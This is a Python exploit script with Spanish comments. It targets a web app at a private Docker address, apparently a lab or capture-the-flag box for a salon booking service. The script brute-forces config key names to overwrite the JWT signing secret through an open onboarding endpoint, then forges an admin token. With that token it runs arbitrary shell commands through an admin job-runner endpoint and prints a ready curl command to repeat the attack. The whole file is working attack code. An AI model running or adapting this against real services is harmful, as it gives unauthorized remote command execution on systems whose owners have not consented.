#!/usr/bin/env python3
"""
jwtToken.py - Config poisoning + JWT forgery

Muestra claramente:
  - La palabra del diccionario que coincidió (nombre de la clave)
  - El valor inyectado (secreto)
  - El token JWT firmado (para reutilizarlo manualmente)
  - La salida del comando ejecutado

Uso:
    python3 jwtToken.py
    python3 jwtToken.py -t http://172.17.0.2:3000 -c "whoami" -w jwt.secrets.list
"""

import argparse
import sys
import warnings
from pathlib import Path

try:
    import jwt
    import requests
except ImportError as e:
    print(f"[-] Falta dependencia: {e}")
    print("[*] Instala con: pip install pyjwt requests")
    sys.exit(1)

warnings.filterwarnings("ignore", category=UserWarning, module="jwt")


# ─────────────────────────────────────────────────────────────
# Defaults
# ─────────────────────────────────────────────────────────────
DEFAULT_TARGET = "http://172.17.0.2:3000"
DEFAULT_SECRET = "supersecreto1222"
DEFAULT_COMMAND = "id"
DEFAULT_WORDLIST = "jwt.secrets.list"
DEFAULT_TIMEOUT = 5


# ─────────────────────────────────────────────────────────────
# Utilidades
# ─────────────────────────────────────────────────────────────
def load_wordlist(path: Path) -> list[str]:
    if not path.exists():
        print(f"[-] No existe: {path}")
        sys.exit(1)
    with path.open("r", encoding="latin-1", errors="ignore") as f:
        return [
            line.strip()
            for line in f
            if line.strip() and not line.strip().startswith("#")
        ]


def is_auth_error(data: dict) -> bool:
    """True si el error indica rechazo de token (candidato incorrecto)."""
    err = (data.get("error") or "").lower()
    if not err:
        return False
    return any(m in err for m in ("jwt", "signature", "forbidden", "unauthorized", "invalid"))


def safe_repr(s: str) -> str:
    """Muestra string con comillas y caracteres especiales visibles."""
    return repr(s)


# ─────────────────────────────────────────────────────────────
# Core
# ─────────────────────────────────────────────────────────────
def inject_config(target, key, value, timeout=5) -> bool:
    """Inyecta {key: value} en el endpoint de onboarding."""
    try:
        r = requests.post(
            f"{target}/v1/onboarding/config",
            json={key: value},
            timeout=timeout,
        )
        return r.status_code == 200
    except requests.RequestException:
        return False


def run_job(target, token, command, timeout=5):
    """Ejecuta un comando en el runner admin."""
    try:
        r = requests.post(
            f"{target}/v1/admin/run-job",
            json={"command": command},
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            },
            timeout=timeout,
        )
        if r.headers.get("content-type", "").startswith("application/json"):
            return r.status_code, r.json()
        return r.status_code, {"raw": r.text}
    except requests.RequestException as e:
        return None, {"error": str(e)}


def try_candidate(target, candidate, secret_value, command, timeout):
    """
    Prueba un candidato como nombre de clave en configs.
    Devuelve (éxito, respuesta, token).
    """
    # 1. Inyectar {candidate: secret_value}
    if not inject_config(target, candidate, secret_value, timeout):
        return False, {"error": "inject_failed"}, None

    # 2. Firmar con secret_value
    try:
        token = jwt.encode({"role": "admin"}, secret_value, algorithm="HS256")
        if isinstance(token, bytes):  # pyjwt < 2.0
            token = token.decode("utf-8")
    except Exception as e:
        return False, {"error": f"jwt_sign_failed: {e}"}, None

    # 3. Ejecutar
    status, data = run_job(target, token, command, timeout)

    # 4. Validación: 200 y sin error de autenticación
    if status == 200 and not is_auth_error(data):
        return True, data, token
    return False, data, token


def restore_state(target, timeout=5):
    """Restaura app_name al valor original (limpieza ética)."""
    try:
        requests.post(
            f"{target}/v1/onboarding/config",
            json={"app_name": "Salón Estilo Lua — Reservas"},
            timeout=timeout,
        )
        print("[*] Estado restaurado (app_name).")
    except requests.RequestException:
        print("[!] No se pudo restaurar el estado.")


# ─────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="Config poisoning + JWT forgery",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-w", "--wordlist", type=Path, default=Path(DEFAULT_WORDLIST),
                   help=f"Ruta al diccionario (default: {DEFAULT_WORDLIST})")
    p.add_argument("-t", "--target", default=DEFAULT_TARGET,
                   help=f"URL base del objetivo (default: {DEFAULT_TARGET})")
    p.add_argument("-c", "--command", default=DEFAULT_COMMAND,
                   help=f"Comando a ejecutar (default: {DEFAULT_COMMAND})")
    p.add_argument("-s", "--secret", default=DEFAULT_SECRET,
                   help=f"Valor a inyectar como secreto (default: {DEFAULT_SECRET})")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                   help=f"Timeout por request (default: {DEFAULT_TIMEOUT}s)")
    p.add_argument("--no-restore", action="store_true",
                   help="No restaurar app_name al finalizar")
    p.add_argument("--no-token", action="store_true",
                   help="No mostrar el token JWT al finalizar")
    return p.parse_args()


def main():
    args = parse_args()

    print("=" * 60)
    print(" Config Poisoning + JWT Forgery")
    print("=" * 60)
    print(f"[*] Target:   {args.target}")
    print(f"[*] Wordlist: {args.wordlist}")
    print(f"[*] Comando:  {args.command}")
    print(f"[*] Secreto:  {args.secret}")
    print(f"[*] Timeout:  {args.timeout}s")
    print("=" * 60)

    try:
        candidates = load_wordlist(args.wordlist)
    except Exception as e:
        print(f"[-] Error cargando wordlist: {e}")
        sys.exit(1)

    print(f"[*] Cargadas {len(candidates)} palabras\n")

    found = None
    for i, candidate in enumerate(candidates, 1):
        print(f"\r[*] [{i}/{len(candidates)}] {candidate[:50]:<50}", end="", flush=True)

        ok, data, token = try_candidate(
            args.target, candidate, args.secret, args.command, args.timeout
        )

        if ok:
            found = (candidate, data, token)
            break

    print()  # nueva línea tras el progreso

    # ─────────────────────────────────────────────────────────
    # Resultado final
    # ─────────────────────────────────────────────────────────
    if found:
        candidate, data, token = found

        print("\n" + "=" * 60)
        print(" ¡ÉXITO!")
        print("=" * 60)
        print(f"  Palabra encontrada : {safe_repr(candidate)}")
        print(f"  Longitud           : {len(candidate)} caracteres")
        print(f"  Bytes (utf-8)      : {candidate.encode('utf-8').hex()}")
        print(f"  Valor inyectado    : {safe_repr(args.secret)}")
        print(f"  Comando ejecutado  : {args.command}")
        print("=" * 60)

        # ─── Token JWT ───
        if not args.no_token and token:
            print("\n[--- JWT firmado ---]")
            print(token)
            print("\n[*] Reproducir manualmente con curl:")
            print(f"curl -X POST {args.target}/v1/admin/run-job \\")
            print(f"  -H 'Authorization: Bearer {token}' \\")
            print(f"  -H 'Content-Type: application/json' \\")
            print(f"  -d '{{\"command\": \"{args.command}\"}}'")
            print("=" * 60)

        # ─── Salida del comando ───
        print("\n[--- Salida del comando ---]")
        stdout = data.get("stdout", "")
        stderr = data.get("stderr", "")
        err = data.get("error")

        if stdout:
            print(stdout.rstrip())
        if stderr:
            print(f"\n[stderr]\n{stderr.rstrip()}")
        if err:
            print(f"\n[error]\n{err}")
        if not stdout and not stderr and not err:
            print("(sin salida)")

        print("\n" + "=" * 60)
    else:
        print("\n[-] No se encontró ninguna clave válida en la wordlist.")

    # ─────────────────────────────────────────────────────────
    # Limpieza
    # ─────────────────────────────────────────────────────────
    if not args.no_restore:
        print()
        restore_state(args.target, args.timeout)


if __name__ == "__main__":
    main()
